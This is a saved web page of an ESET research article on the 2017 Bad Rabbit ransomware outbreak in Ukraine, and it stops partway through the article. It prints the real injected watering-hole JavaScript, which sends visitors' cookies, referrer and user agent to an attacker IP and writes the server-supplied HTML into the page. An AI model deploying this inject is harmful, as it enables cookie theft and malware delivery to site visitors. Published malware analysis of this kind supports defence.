<!doctype html>
<html lang="en-US" prefix="og: http://ogp.me/ns#">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    <meta name="viewport" content="width=device-width, initial-scale=1"/>
    <meta name="google-site-verification" content="_b2avZwzr79oru6lM2Ddae1fNpSIbPaP0H0WNkc2x3k"/>
    <meta name="msvalidate.01" content="CE77828A466C2513F660017CFCB6BA13"/>
    <link rel="icon" href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/favicon.ico">

    

            
    
    <link href="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/css/main.css?id=b3e7fe8a6c3736dca145" rel="stylesheet">
    <script type="text/javascript"> var appInsights=window.appInsights||function(a){ function b(a){c[a]=function(){var b=arguments;c.queue.push(function(){c[a].apply(c,b)})}}var c={config:a},d=document,e=window;setTimeout(function(){var b=d.createElement("script");b.src=a.url||"https://az416426.vo.msecnd.net/scripts/a/ai.0.js",d.getElementsByTagName("script")[0].parentNode.appendChild(b)});try{c.cookie=d.cookie}catch(a){}c.queue=[];for(var f=["Event","Exception","Metric","PageView","Trace","Dependency"];f.length;)b("track"+f.pop());if(b("setAuthenticatedUserContext"),b("clearAuthenticatedUserContext"),b("startTrackEvent"),b("stopTrackEvent"),b("startTrackPage"),b("stopTrackPage"),b("flush"),!a.disableExceptionTracking){f="onerror",b("_"+f);var g=e[f];e[f]=function(a,b,d,e,h){var i=g&&g(a,b,d,e,h);return!0!==i&&c["_"+f](a,b,d,e,h),i}}return c }({ instrumentationKey:"dcb460fe-684e-4d39-bfcd-d3a6f2710a32" }); window.appInsights=appInsights,appInsights.queue&&0===appInsights.queue.length&&appInsights.trackPageView(); </script>
    <script>
        window.dataLayer = window.dataLayer || [];
    window.dataLayer.push({
        'Author': 'Marc-Etienne M.Léveillé',
        'ArticleCategory': 'Ransomware',
        'ArticleSection': 'Research',
        'cookie-bar-hq': true
    });
</script>
<script>
    (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
        new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-PMDGSM');
</script>

<!-- This site is optimized with the Yoast SEO plugin v9.2 - https://yoast.com/wordpress/plugins/seo/ -->
<title>Bad Rabbit: Not&#8209;Petya is back with improved ransomware | WeLiveSecurity</title>
<meta name="description" content="A new ransomware outbreak today has hit some major infrastructure in Ukraine including Kiev metro. Here are some details about this new variant of Petya."/>
<link rel="canonical" href="https://www.welivesecurity.com/2017/10/24/bad-rabbit-not-petya-back/" />
<meta property="og:locale" content="en_US" />
<meta property="og:locale:alternate" content="pt_BR" />
<meta property="og:locale:alternate" content="de_DE" />
<meta property="og:type" content="article" />
<meta property="og:title" content="Bad Rabbit: Not&#8209;Petya is back with improved ransomware | WeLiveSecurity" />
<meta property="og:description" content="A new ransomware outbreak today has hit some major infrastructure in Ukraine including Kiev metro. Here are some details about this new variant of Petya." />
<meta property="og:url" content="https://www.welivesecurity.com/2017/10/24/bad-rabbit-not-petya-back/" />
<meta property="og:site_name" content="WeLiveSecurity" />
<meta property="article:section" content="Ransomware" />
<meta property="article:published_time" content="2017-10-24T18:48:58+00:00" />
<meta property="article:modified_time" content="2017-11-09T21:33:02+00:00" />
<meta property="og:updated_time" content="2017-11-09T21:33:02+00:00" />
<meta property="og:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/10/bad-rabbit-not-petya-back-1024x683.jpg" />
<meta property="og:image:secure_url" content="https://www.welivesecurity.com/wp-content/uploads/2017/10/bad-rabbit-not-petya-back-1024x683.jpg" />
<meta property="og:image:width" content="1024" />
<meta property="og:image:height" content="683" />
<meta property="og:image:alt" content="bad-rabbit-not-petya-back" />
<meta name="twitter:card" content="summary" />
<meta name="twitter:description" content="A new ransomware outbreak today has hit some major infrastructure in Ukraine including Kiev metro. Here are some details about this new variant of Petya." />
<meta name="twitter:title" content="Bad Rabbit: Not&#8209;Petya is back with improved ransomware | WeLiveSecurity" />
<meta name="twitter:site" content="@welivesecurity" />
<meta name="twitter:image" content="https://www.welivesecurity.com/wp-content/uploads/2017/10/bad-rabbit-not-petya-back.jpg" />
<meta name="twitter:creator" content="@marc_etienne_" />
<!-- / Yoast SEO plugin. -->

<link rel='stylesheet' id='crayon-theme-classic-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/themes/classic/classic.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel='stylesheet' id='crayon-font-monaco-css'  href='https://www.welivesecurity.com/wp-content/plugins/crayon-syntax-highlighter/fonts/monaco.css?ver=_2.7.2_beta' type='text/css' media='all' />
<link rel="alternate" href="https://www.welivesecurity.com/br/2017/10/25/bad-rabbit-not-petya-volta/" hreflang="pt" />
<link rel="alternate" href="https://www.welivesecurity.com/2017/10/24/bad-rabbit-not-petya-back/" hreflang="en" />
<link rel="alternate" href="https://www.welivesecurity.com/la-es/2017/10/25/bad-rabbit-not-petya-de-vuelta/" hreflang="es" />
<link rel="alternate" href="https://www.welivesecurity.com/deutsch/2017/10/26/bad-rabbit-not-petya-ransomware-zurueck/" hreflang="de" />
<link rel="alternate" type="application/rss+xml" title="WeLiveSecurity RSS 2.0 Feed" href="/rss-configurator/" /><style type="text/css" id="syntaxhighlighteranchor"></style>
        <link id="cookie-style" rel="stylesheet" type="text/css" href="https://assets.esetstatic.com/3PS/cookiebar.min.css">

<script>(window.BOOMR_mq=window.BOOMR_mq||[]).push(["addVar",{"rua.upush":"false","rua.cpush":"false","rua.upre":"false","rua.cpre":"false","rua.uprl":"false","rua.cprl":"false","rua.cprf":"false","rua.trans":"","rua.cook":"false","rua.ims":"false","rua.ufprl":"false","rua.cfprl":"false","rua.isuxp":"false","rua.texp":"norulematch"}]);</script>
                              <script>!function(e){var n="https://s.go-mpulse.net/boomerang/";if("False"=="True")e.BOOMR_config=e.BOOMR_config||{},e.BOOMR_config.PageParams=e.BOOMR_config.PageParams||{},e.BOOMR_config.PageParams.pci=!0,n="https://s2.go-mpulse.net/boomerang/";if(window.BOOMR_API_key="7R9SM-QGSYF-QDLJK-UETXR-SPM6B",function(){function e(){if(!o){var e=document.createElement("script");e.id="boomr-scr-as",e.src=window.BOOMR.url,e.async=!0,i.parentNode.appendChild(e),o=!0}}function t(e){o=!0;var n,t,a,r,d=document,O=window;if(window.BOOMR.snippetMethod=e?"if":"i",t=function(e,n){var t=d.createElement("script");t.id=n||"boomr-if-as",t.src=window.BOOMR.url,BOOMR_lstart=(new Date).getTime(),e=e||d.body,e.appendChild(t)},!window.addEventListener&&window.attachEvent&&navigator.userAgent.match(/MSIE [67]\./))return window.BOOMR.snippetMethod="s",void t(i.parentNode,"boomr-async");a=document.createElement("IFRAME"),a.src="about:blank",a.title="",a.role="presentation",a.loading="eager",r=(a.frameElement||a).style,r.width=0,r.height=0,r.border=0,r.display="none",i.parentNode.appendChild(a);try{O=a.contentWindow,d=O.document.open()}catch(_){n=document.domain,a.src="javascript:var d=document.open();d.domain='"+n+"';void(0);",O=a.contentWindow,d=O.document.open()}if(n)d._boomrl=function(){this.domain=n,t()},d.write("<bo"+"dy onload='document._boomrl();'>");else if(O._boomrl=function(){t()},O.addEventListener)O.addEventListener("load",O._boomrl,!1);else if(O.attachEvent)O.attachEvent("onload",O._boomrl);d.close()}function a(e){window.BOOMR_onload=e&&e.timeStamp||(new Date).getTime()}if(!window.BOOMR||!window.BOOMR.version&&!window.BOOMR.snippetExecuted){window.BOOMR=window.BOOMR||{},window.BOOMR.snippetStart=(new Date).getTime(),window.BOOMR.snippetExecuted=!0,window.BOOMR.snippetVersion=12,window.BOOMR.url=n+"7R9SM-QGSYF-QDLJK-UETXR-SPM6B";var i=document.currentScript||document.getElementsByTagName("script")[0],o=!1,r=document.createElement("link");if(r.relList&&"function"==typeof r.relList.supports&&r.relList.supports("preload")&&"as"in r)window.BOOMR.snippetMethod="p",r.href=window.BOOMR.url,r.rel="preload",r.as="script",r.addEventListener("load",e),r.addEventListener("error",function(){t(!0)}),setTimeout(function(){if(!o)t(!0)},3e3),BOOMR_lstart=(new Date).getTime(),i.parentNode.appendChild(r);else t(!1);if(window.addEventListener)window.addEventListener("load",a,!1);else if(window.attachEvent)window.attachEvent("onload",a)}}(),"".length>0)if(e&&"performance"in e&&e.performance&&"function"==typeof e.performance.setResourceTimingBufferSize)e.performance.setResourceTimingBufferSize();!function(){if(BOOMR=e.BOOMR||{},BOOMR.plugins=BOOMR.plugins||{},!BOOMR.plugins.AK){var n=""=="true"?1:0,t="",a="eaaqm7bfmqcrqkqce3yp4aaaabroux7z-f-a032a28bb-clienttons-s.akamaihd.net",i="false"=="true"?2:1,o={"ak.v":"32","ak.cp":"1251022","ak.ai":parseInt("757730",10),"ak.ol":"0","ak.cr":10,"ak.ipv":6,"ak.proto":"http/1.1","ak.rid":"140bbe15","ak.r":44866,"ak.a2":n,"ak.m":"","ak.n":"ff","ak.bpcip":"2001:67c:2564:518::","ak.cport":43350,"ak.gh":"92.122.101.47","ak.quicv":"","ak.tlsv":"tls1.3","ak.0rtt":"","ak.csrc":"-","ak.acc":"reno","ak.t":"1659527161","ak.ak":"hOBiQwZUYzCg5VSAfCLimQ==15UXyS0srmRnm+Lmg12LCd2R8Ypw5WCJMxCRkPkkFrRKeFrZtdIDech2bAuyfXH6FTu7uKBkXr0SzwwOjXI6ftvmzxCVdbb/8tn9yy4kivTIC8zqaKzwkWRvJcA3eF6vQI6r7Ti8ahrUCV99vOd4RPxWhinNuF5RdELL0p+IW1g2MSmU0OOVmBpGtsevnG2TQzHiMYW+loYosQHg/ZWprrhDjCf7z4WIbHbuyZH86RX0yfNU7b+/miBr/VD2rYXNL/vN6CzgLV7NDiasQ6M1KuecPlZfPm+lYG4y9ARGd6Jg3pSidnri6nWX1BAJN5nefJf9sbHJRJIUG32a+c5rrutbCMz15gCDK0avcko6QMQHcGbRTieIla0TIg/JBMnWRUauyqqA0dvbjRyEGH3J7FfEsT7jt0nQa9Ggzm+NMsc=","ak.pv":"11","ak.dpoabenc":"","ak.tf":i};if(""!==t)o["ak.ruds"]=t;var r={i:!1,av:function(n){var t="http.initiator";if(n&&(!n[t]||"spa_hard"===n[t]))o["ak.feo"]=void 0!==e.aFeoApplied?1:0,BOOMR.addVar(o)},rv:function(){var e=["ak.bpcip","ak.cport","ak.cr","ak.csrc","ak.gh","ak.ipv","ak.m","ak.n","ak.ol","ak.proto","ak.quicv","ak.tlsv","ak.0rtt","ak.r","ak.acc","ak.t","ak.tf"];BOOMR.removeVar(e)}};BOOMR.plugins.AK={akVars:o,akDNSPreFetchDomain:a,init:function(){if(!r.i){var e=BOOMR.subscribe;e("before_beacon",r.av,null,null),e("onbeacon",r.rv,null,null),r.i=!0}return this},is_complete:function(){return!0}}}}()}(window);</script></head>
<body class="no-js single noimage">
<noscript>
	<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-PMDGSM" height="0" width="0" style="display:none;visibility:hidden"></iframe>
</noscript>

<div class="main">
    <header id="site-header" class="container">
        <div class="row">
            <div class="col-md-4 col-sm-12 col-xs-12 pull-right" id="header-nav">
                <div class="row">
                    <div class="hidden-lg hidden-md col-sm-7 col-xs-8 hidden-xxs">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
                    <div class="col-md-8 hidden-sm hidden-xs languages">
                        <div class="dropdown">
	<button class="btn btn-default dropdown-toggle" type="button" id="main-language-picker" data-toggle="dropdown" aria-haspopup="true" aria-expanded="true">
    	<span class="text">In English</span>
    	<span class="icomoon icon-icon_arrow"></span>
  	</button>
  	<ul class="dropdown-menu" aria-labelledby="main-language-picker">
            <li>
        <a href="/br/2017/10/25/bad-rabbit-not-petya-volta/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/10/25/bad-rabbit-not-petya-de-vuelta/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2017/10/26/bad-rabbit-not-petya-ransomware-zurueck/" title="In Deutsch">
            In Deutsch        </a>
    </li>
      	</ul>
</div>                    </div>
                    <div class="col-md-4 col-sm-2 col-xs-3 menu-trigger">
                        <div class="menu-btn">
	<span class="text">Menu</span>
	<button type="button" id="menu-trigger" class="tcon tcon-menu--xcross" aria-label="toggle menu">
        <span class="wrapper">
            <span class="tcon-menu__lines" aria-hidden="true"></span>
            <span class="tcon-visuallyhidden">toggle menu</span>
        </span>
    </button>
</div>                    </div>
                    <div class="col-md-12 col-sm-12 col-xs-12 imc" id="main-menu">
                        <nav class="menu clearfix imc">
                            <ul class="col-md-12 col-sm-6 col-xs-6 imc">
                                                                    <li class="">
                                        <a href="/">
                                            All Posts                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="http://welivesecurity.com/category/ukraine-crisis-digital-security-resource-center/">
                                            Ukraine Crisis – Digital Security Resource Center                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/we-live-progress/">
                                            We Live Progress                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/research">
                                            Research                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="/category/how-to/">
                                            How To                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/media/videos/">
                                            Videos                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/conference-papers/">
                                            Conference Materials                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/white-papers/">
                                            White Papers                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/threat-reports/">
                                            Threat Reports                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/papers/magazine/">
                                            Magazine                                        </a>
                                    </li>
                                                                    <li class="">
                                        <a href="https://www.welivesecurity.com/our-experts/">
                                            Our Experts                                        </a>
                                    </li>
                                                            </ul>

                            <div class="col-md-12 col-sm-6 col-xs-6 imc">
                                <ul class="languages hidden-lg hidden-md hidden-xxs col-xs-12 imc">
                                        <li>
        <a href="/br/2017/10/25/bad-rabbit-not-petya-volta/" title="Em Português">
            Em Português        </a>
    </li>
        <li>
        <a href="/fr/" title="En français">
            En français        </a>
    </li>
        <li>
        <a href="/la-es/2017/10/25/bad-rabbit-not-petya-de-vuelta/" title="En Español">
            En Español        </a>
    </li>
        <li>
        <a href="/deutsch/2017/10/26/bad-rabbit-not-petya-ransomware-zurueck/" title="In Deutsch">
            In Deutsch        </a>
    </li>
                                    </ul>
                            </div>
                        </nav>
                    </div>
                    <div class="menu-overlay col-md-12 col-sm-12 col-xs-12 imc">
                        <div class="inner imc"></div>
                    </div>
                </div>
            </div>
            <div class="col-md-5 hidden-sm hidden-xs pull-left" id="header-logo">
                <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                <span class="slogan hidden-sm hidden-xs">
						Award-winning news, views, and insight from the ESET <strong>security community</strong>					</span>
            </div>
        </div>
    </header>
        <section id="article-detail">
            <div class="hero-noimage">
	<div class="container promo-text">
		<div class="inner clearfix">
			<div class="col-md-11 col-sm-11 col-xs-12 no-padding">
				<h1>Bad Rabbit: Not&#8209;Petya is back with improved ransomware</h1>
<div class="excerpt">A new ransomware outbreak today has hit some major infrastructure in Ukraine including Kiev metro. Here are some details about this new variant of Petya.</div>
<div class="post-meta">
    <div class="wls-authors">
                <div class="wls-author with-avatar">
                            <div class="wls-author-avatar">
                    <a href="https://www.welivesecurity.com/author/marc-etienne/" title="Marc-Etienne M.Léveillé">
                        <img src="https://www.welivesecurity.com/wp-content/uploads/2013/06/Marc-Etienne-M.Leveille.png" alt="Marc-Etienne M.Léveillé">
                    </a>
                </div>
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/marc-etienne/" title="Marc-Etienne M.Léveillé">
                    Marc-Etienne M.Léveillé                </a>
            </div>
        </div>
            </div>
    <span class="meta">
		<span class="strong">
			<time datetime="2017-10-24 20:48:58">24 Oct 2017 - 08:48PM</time>
		</span>
			</span>
</div>
			</div>
		</div>
	</div>
</div>	

            <div class="content">
                <div class="social-wrapper" id="social-sharer">
                    <span class="text">Share</span>
	<a class="share-facebook" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F24%2Fbad-rabbit-not-petya-back%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Facebook">
		<span class="icomoon icon-icon_fb"></span>
	</a>
	<a class="share-twitter" href="https://twitter.com/intent/tweet?&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F24%2Fbad-rabbit-not-petya-back%2F&text=Bad Rabbit: Not&#8209;Petya is back with improved ransomware%0A&via=welivesecurity" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Twitter">
		<span class="icomoon icon-icon_tw"></span>
	</a>
	<a class="share-linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3A%2F%2Fwww.welivesecurity.com%2F2017%2F10%2F24%2Fbad-rabbit-not-petya-back%2F" target="blank" data-toggle="tooltip" data-placement="top" data-original-title="Share on Linkedin">
		<span class="icomoon icon-icon_in"></span>
	</a>
                </div>
                <div class="container">
                    <div class="row">
                        <div class="col-md-1 col-sm-1 hidden-xs">

                        </div>
                        <div class="col-md-10 col-sm-10 col-xs-12 formatted">

                            <div class="excerpt noimage">
                                <p>A new ransomware outbreak today has hit some major infrastructure in Ukraine including Kiev metro. Here are some details about this new variant of Petya.</p>
                            </div>

                            <p><em>UPDATE (October 27 &#8211; 15:35 CEST): A new <a href="http://blog.talosintelligence.com/2017/10/bad-rabbit.html" target="_blank" rel="noopener">report</a> suggested that EternalRomance &#8211; one of the leaked NSA tools &#8211; has been used to spread Diskcoder.D in the network. We were able to confirm this by installing the out-of-life-cycle patch MS17-010 (a patch addressing vulnerabilities misused by the leaked NSA exploits), which stopped the further spread of the malware via IPC share.</em></p>
<p>A new ransomware outbreak today and has <a href="https://www.welivesecurity.com/2017/10/24/kiev-metro-hit-new-variant-infamous-diskcoder-ransomware/" target="_blank" rel="noopener">hit some major infrastructure in Ukraine including Kiev metro</a>. Here are some of the details about this new variant.</p>
<h2>Drive-by download via watering hole on popular sites</h2>
<p class="">One of the distribution method of Bad Rabbit is via drive-by download. Some popular websites are compromised and have JavaScript injected in their HTML body or in one of their <span style="font-family: 'courier new', courier, monospace;">.js</span> files.</p>
<p><a href="/wp-content/uploads/2017/10/injected.png"><img class="aligncenter size-large wp-image-102826" src="/wp-content/uploads/2017/10/injected-1024x785.png" alt="" width="1024" height="785" srcset="https://www.welivesecurity.com/wp-content/uploads/2017/10/injected-1024x785.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2017/10/injected-300x230.png 300w, https://www.welivesecurity.com/wp-content/uploads/2017/10/injected-768x589.png 768w, https://www.welivesecurity.com/wp-content/uploads/2017/10/injected.png 1312w" sizes="(max-width: 1024px) 100vw, 1024px" /></a></p>
<p>Here is a beautified version of the inject:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-62ea5ff9c06a1418337224" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div><span class="crayon-language">JavaScript</span></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
function e(d) {
  var xhr = null;
  if (!!window.XMLHttpRequest) {
    xhr = new XMLHttpRequest();
  } else if (!!window.ActiveXObject) {
    var xhrs = ['Microsoft.XMLHTTP', 'Msxml2.XMLHTTP', 'Msxml2.XMLHTTP.3.0', 'Msxml2.XMLHTTP.6.0'];
    for (var i = 0; i &lt; xhrs.length; i++) {
      try {
        xhr = ActiveXObject(xhrs[i]);
        break;
      } catch (e) {}
    }
  }
  if (!!xhr) {
    xhr.open('POST', 'http://185.149.120\.3/scholargoogle/');
    xhr.timeout = 10000;
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) {
        var resp = xhr.responseText;
        if (resp) {
          var fans = JSON.parse(resp);
          if (fans) {
            var an_s = decodeURIComponent(fans.InjectionString).replace(/\+/g, '%20');
            var da = document.createElement('div');
            da.id = 'ans';
            da.innerHTML = an_s;
            document.body.appendChild(da);
          }
        }
      }
    };
    var pd = [];
    for (var k in d) {
      if (d.hasOwnProperty(k)) {
        pd.push(k + '=' + d[k]);
      }
    }
    var dc = pd.join('&amp;');
    xhr.send(dc);
  }
}
e({
  'agent': navigator.userAgent,
  'referer': document.referrer,
  'cookie': document.cookie,
  'domain': window.location.hostname,
  'c_state': !!document.cookie
});</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="hide">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-2">2</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-4">4</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-6">6</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-8">8</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-10">10</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-12">12</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-13">13</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-14">14</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-15">15</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-16">16</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-17">17</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-18">18</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-19">19</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-20">20</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-21">21</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-22">22</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-23">23</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-24">24</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-25">25</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-26">26</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-27">27</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-28">28</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-29">29</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-30">30</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-31">31</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-32">32</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-33">33</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-34">34</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-35">35</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-36">36</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-37">37</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-38">38</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-39">39</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-40">40</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-41">41</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-42">42</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-43">43</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-44">44</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-45">45</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-46">46</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-47">47</div><div class="crayon-num crayon-striped-num" data-line="crayon-62ea5ff9c06a1418337224-48">48</div><div class="crayon-num" data-line="crayon-62ea5ff9c06a1418337224-49">49</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-1"><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">e</span><span class="crayon-sy">(</span><span class="crayon-v">d</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-v">xhr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-t">null</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-3"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-st">if</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-o">!</span><span class="crayon-o">!</span><span class="crayon-v">window</span><span class="crayon-sy">.</span><span class="crayon-v">XMLHttpRequest</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-62ea5ff9c06a1418337224-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-v">xhr</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-r">new</span><span class="crayon-h"> </span><span class="crayon-e">XMLHttpRequest</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-62ea5ff9c06a1418337224-5"><span class="crayon-h">&nbsp;&nbsp;</span><span 